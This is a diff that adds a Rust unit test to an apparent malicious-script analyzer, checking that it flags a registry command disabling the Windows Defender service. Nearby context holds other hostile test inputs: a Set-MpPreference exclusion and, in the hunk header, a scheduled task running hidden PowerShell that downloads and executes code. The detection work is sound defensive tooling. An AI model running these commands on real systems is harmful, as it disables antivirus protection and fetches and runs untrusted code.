@@ -2966,6 +2966,23 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn reg_service_start_hex_padded_disabled_emits_defender_evasion_trait() {
+        let script =
+            br#"reg add HKLM\System\CurrentControlSet\Services\WinDefend /v Start /t REG_DWORD /d 0x00000004 /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "service-start-disabled" && target == "WinDefend"
+            )),
+            "padded hex service-start disablement was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn set_mppreference_exclusions_emit_defender_evasion_traits() {
         let script = br#"powershell -Command "Set-MpPreference -ExclusionPath 'C:\Users\Public' -ExclusionProcess calc.exe"
 "#;
